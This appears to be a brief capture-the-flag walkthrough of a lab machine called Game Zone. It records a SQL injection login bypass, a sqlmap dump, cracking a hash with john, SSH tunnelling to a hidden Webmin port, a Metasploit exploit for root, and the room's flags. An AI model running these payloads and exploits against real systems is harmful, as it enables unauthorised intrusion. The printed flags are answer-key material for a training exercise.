```
Game Zone - 10.10.36.145
```

# Ports Open - 22,80

# Details of Ports
22		ssh
80		http

# Exploitation
> found the website on port 80 vulnerable to sql injection on login form
> put " ' OR 1=1-- -" ad username with blank password and got in
> found th eportal.php also vulnerable to sql injection
> send the request and recorded it and gave to sqlmap
	sqlmap -r req.txt --dbms=mysql --batch
> did some enumeration and found a username with a hashed pass
> used hash-identifier to identify it as sha-256
> used john to crack it
> ssh into the macchine using the password and username
> got user flag
	649ac17b1480ac13ef1e4fa579dac95c
> used ssh tunneling to access the port 10000 behind firewall
	ss -tulp (showed the port)
> used the command to get 10000 port
	ssh -L 10000:127.0.0.1:10000 agent47@10.10.36.145
> access the port 10000 from the browser at 127.0.0.1:10000
> found webmin used the same cred got in
> used msfconsole to find the exploit "webmin_show_cgi_exec"
> ran and got root
	a4b945830144bdd71908d12d902adeee